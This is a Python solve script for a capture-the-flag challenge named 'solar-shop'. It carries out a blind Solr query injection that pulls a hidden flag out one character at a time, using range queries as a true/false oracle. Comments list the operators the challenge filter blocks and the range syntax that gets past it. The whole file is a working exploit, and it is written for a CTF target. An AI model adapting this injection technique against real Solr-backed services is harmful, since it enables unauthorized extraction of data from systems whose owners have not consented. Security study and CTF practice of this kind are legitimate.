#!/usr/bin/env python3
# solve.py — solar-shop Solr Injection blind extraction
# Technique: Solr range queries as oracle to extract flag char by char
# Blocked: AND OR * < > || && | & + -
# NOT blocked: TO (range syntax), spaces (implicit OR), field:value syntax

import requests
import re
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://hackon-solar.chals.io"

# Alphabet in lexicographic/ASCII order: digits first, then lowercase
ALPHABET = '0123456789abcdefghijklmnopqrstuvwxyz'
FLAG_LEN  = 12

def oracle(q):
    """Returns True if the flag document (id=69) appears in results."""
    r = requests.get(BASE, params={'q': q}, timeout=15)
    return bool(re.search(r'<div class="product">', r.text))

def extract_flag():
    known = ''
    total_queries = 0

    for pos in range(FLAG_LEN):
        lo, hi = 0, len(ALPHABET) - 1

        while lo < hi:
            mid      = (lo + hi) // 2
            mid_char = ALPHABET[mid]

            # Range: [known + '0'*(12-pos)  TO  known + mid_char + 'z'*(11-pos)]
            # Tests whether flag[pos] <= mid_char (given known prefix)
            low_bound  = known + '0' * (FLAG_LEN - pos)
            high_bound = known + mid_char + 'z' * (FLAG_LEN - pos - 1)

            q = f'nonexistent flag:[{low_bound} TO {high_bound}]'
            total_queries += 1

            if oracle(q):
                hi = mid     # flag[pos] <= mid_char
            else:
                lo = mid + 1 # flag[pos] >  mid_char

        found_char = ALPHABET[lo]
        known += found_char
        print(f'[+] pos={pos:2d}  char="{found_char}"  flag_so_far="{known}"  '
              f'(queries used: {total_queries})', flush=True)

    return known

print('[*] Starting blind Solr range-query extraction...')
print(f'[*] Alphabet: {ALPHABET}  ({len(ALPHABET)} chars)')
print(f'[*] Expected queries: ~{FLAG_LEN * 6} (6 per position)\n')

inner = extract_flag()
flag  = f'HackOn{{{inner}}}'

print(f'\n[+] FLAG: {flag}')

with open('flag.txt', 'w') as f:
    f.write(flag + '\n')
print('[+] Saved to flag.txt')
